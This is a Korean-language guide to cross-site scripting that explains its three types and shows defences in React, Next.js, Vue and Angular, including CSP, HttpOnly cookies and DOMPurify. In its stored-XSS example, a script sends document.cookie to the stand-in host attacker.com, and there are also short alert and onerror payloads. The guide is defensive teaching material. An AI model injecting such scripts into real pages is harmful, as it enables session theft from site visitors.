# XSS (Cross-Site Scripting) 공격과 방어 가이드

## 1. XSS란?

공격자가 **악성 JavaScript를 웹페이지에 끼워넣어, 다른 사용자의 브라우저에서 실행되게 하는 공격**입니다.

브라우저 입장에서는 그 스크립트가 사이트 주인이 작성한 것인지, 공격자가 끼워넣은 것인지 구분할 수 없습니다. 같은 출처(origin)에서 실행되기 때문에 **쿠키, 세션, localStorage, DOM 전체에 접근 가능**합니다.

---

## 2. XSS의 3가지 유형

### 2.1 Stored XSS (저장형)

악성 스크립트가 서버 DB에 저장되어, 해당 데이터를 보는 모든 사용자가 피해를 입습니다.

**시나리오 예시**

```html
<!-- 공격자가 댓글에 입력 -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

이 댓글이 그대로 렌더링되면, 페이지 방문자 전원의 쿠키가 탈취됩니다.

### 2.2 Reflected XSS (반사형)

URL 파라미터 등에 스크립트를 넣고, 서버가 이를 그대로 응답에 반사할 때 발생합니다.

```
https://example.com/search?q=<script>alert('XSS')</script>
```

피싱 링크 형태로 사용자에게 전달되어 클릭을 유도합니다.

### 2.3 DOM-based XSS

서버를 거치지 않고 클라이언트 JavaScript가 DOM을 조작하다가 발생합니다.

```js
// 위험한 코드
const params = new URLSearchParams(location.search)
document.getElementById('greeting').innerHTML = params.get('name')
// ?name=<img src=x onerror=alert(1)>
```

---

## 3. 공격으로 가능한 피해

- **세션 하이재킹**: 쿠키 탈취 후 로그인 상태 도용
- **키로깅**: 비밀번호, 카드번호 입력 가로채기
- **피싱 폼 삽입**: 가짜 로그인창 띄우기
- **CSRF 우회**: 사용자 권한으로 API 호출
- **악성코드 배포**: 다운로드 트리거
- **암호화폐 지갑 주소 바꿔치기**

---

## 4. 일반적인 방어 원칙

### 4.1 출력 시 이스케이프 (Output Encoding)

사용자 입력을 HTML로 출력할 때 특수문자를 엔티티로 변환합니다.

| 문자 | 변환 |
|------|------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

### 4.2 입력 Sanitize (정화)

리치 텍스트처럼 일부 HTML을 허용해야 하면, 검증된 라이브러리로 정화합니다. 직접 정규식으로 막으려 하지 마세요.

### 4.3 CSP (Content Security Policy) 헤더

브라우저에 신뢰할 수 있는 스크립트 출처를 명시하는 응답 헤더입니다.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

인라인 `<script>`도 차단할 수 있어 강력합니다.

### 4.4 HttpOnly 쿠키

세션 쿠키에 `HttpOnly` 플래그를 붙이면 JavaScript에서 `document.cookie`로 접근할 수 없습니다.

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 4.5 URL 검증

`href`, `src` 속성에 `javascript:` 스킴이 들어가지 않게 막습니다.

```js
const safeHref = /^https?:\/\//.test(url) ? url : '#'
```

---

## 5. 프론트엔드 기술별 방어 방식

### 5.1 React

**기본 동작: 자동 이스케이프**

React는 JSX의 `{}` 안에 들어가는 모든 값을 자동으로 이스케이프합니다.

```jsx
// 안전: <script> 태그가 문자열로 출력됨
function Comment({ text }) {
  return <div>{text}</div>
}

// text가 "<script>alert(1)</script>"여도 그대로 텍스트로 표시
```

**위험 구간: `dangerouslySetInnerHTML`**

이름 그대로 위험합니다. 안전망이 해제되므로 반드시 sanitize 후 사용하세요.

```jsx
import DOMPurify from 'dompurify'

function RichContent({ html }) {
  const clean = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

**href 주입 주의**

React는 `href`의 `javascript:` 스킴은 막아주지만, 신뢰하지 말고 직접 검증하세요.

```jsx
function SafeLink({ url, children }) {
  const isValid = /^(https?:|mailto:|\/)/.test(url)
  return <a href={isValid ? url : '#'}>{children}</a>
}
```

### 5.2 Next.js

**Server Components의 안전성**

Server Component에서 fetch한 데이터를 JSX에 렌더링하면 React의 자동 이스케이프가 그대로 적용됩니다.

```jsx
// app/posts/[id]/page.jsx
export default async function Post({ params }) {
  const { id } = await params
  const post = await fetch(`/api/posts/${id}`).then(r => r.json())
  return <article>{post.content}</article>  // 안전
}
```

**CSP 헤더 설정**

`next.config.js`에서 CSP 헤더를 설정합니다.

```js
// next.config.js
module.exports = {
  async headers() {
    return [{
      source: '/:path*',
      headers: [{
        key: 'Content-Security-Policy',
        value: "default-src 'self'; script-src 'self' 'nonce-{NONCE}'"
      }]
    }]
  }
}
```

**Middleware로 nonce 기반 CSP**

Next 13+에서는 middleware로 요청마다 nonce를 생성해 인라인 스크립트를 안전하게 허용할 수 있습니다.

```js
// middleware.js
import { NextResponse } from 'next/server'

export function middleware(request) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64')
  const csp = `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`
  
  const response = NextResponse.next()
  response.headers.set('Content-Security-Policy', csp)
  response.headers.set('x-nonce', nonce)
  return response
}
```

### 5.3 Vue

**Mustache 문법: 자동 이스케이프**

```vue
<template>
  <div>{{ userInput }}</div>  <!-- 안전 -->
</template>
```

**위험 구간: `v-html`**

```vue
<template>
  <div v-html="userInput"></div>  <!-- 위험 -->
</template>

<!-- 안전한 사용 -->
<script setup>
import DOMPurify from 'dompurify'
const safeHtml = computed(() => DOMPurify.sanitize(props.html))
</script>
<template>
  <div v-html="safeHtml"></div>
</template>
```

### 5.4 Angular

Angular는 가장 엄격한 기본 정책을 가집니다. 모든 값을 **세 가지 컨텍스트(HTML, URL, Resource URL)**로 분류해 자동 sanitize합니다.

```ts
// 자동으로 sanitize됨
<div [innerHTML]="userInput"></div>

// 신뢰 명시 (위험, 정말 필요할 때만)
import { DomSanitizer } from '@angular/platform-browser'
constructor(private sanitizer: DomSanitizer) {}
this.trusted = this.sanitizer.bypassSecurityTrustHtml(html)
```

### 5.5 일반 HTML/JavaScript

직접 DOM을 조작할 때는 가장 위험합니다.

```js
// 위험
element.innerHTML = userInput
document.write(userInput)
eval(userInput)

// 안전
element.textContent = userInput  // 텍스트로만 처리
element.setAttribute('data-name', userInput)  // 속성도 textContent와 동일하게 안전
```

---

## 6. 실전 체크리스트

다음 항목을 프로젝트마다 점검하세요.

- [ ] 사용자 입력을 그대로 `innerHTML`, `v-html`, `dangerouslySetInnerHTML`에 넣지 않는다
- [ ] HTML 허용이 필요하면 DOMPurify 등으로 sanitize한다
- [ ] CSP 헤더를 설정하고, 가능하면 nonce 기반으로 운영한다
- [ ] 세션 쿠키는 `HttpOnly`, `Secure`, `SameSite` 플래그를 붙인다
- [ ] `href`, `src`에 사용자 입력이 들어가면 스킴을 검증한다
- [ ] `eval`, `Function()`, `setTimeout(string, ...)` 사용을 금지한다
- [ ] 서버 응답의 `Content-Type`을 정확히 지정한다 (`X-Content-Type-Options: nosniff`)
- [ ] 의존성 패키지를 정기적으로 감사한다 (`npm audit`)

---

## 7. 추천 라이브러리

| 라이브러리 | 용도 |
|-----------|------|
| **DOMPurify** | HTML sanitize의 사실상 표준 |
| **sanitize-html** | Node.js 환경 sanitize |
| **helmet** | Express에서 보안 헤더 일괄 설정 |
| **validator.js** | URL, 이메일 등 입력 검증 |

---

## 8. 핵심 정리

> XSS의 본질은 **"사용자 입력을 코드로 해석하게 만드는 것"**이며,
> 방어의 본질은 **"입력은 항상 데이터로만 취급하는 것"**입니다.

모던 프레임워크(React, Vue, Angular)는 기본적으로 안전망을 제공하지만, **`dangerouslySetInnerHTML` / `v-html` / `bypassSecurityTrust*`** 같은 우회 API를 쓰는 순간 그 안전망이 사라집니다. 이 지점에서만 주의해도 대부분의 XSS는 막을 수 있습니다.

거기에 **CSP 헤더**와 **HttpOnly 쿠키**를 더하면 실수가 있어도 피해를 최소화할 수 있는 다층 방어가 완성됩니다.
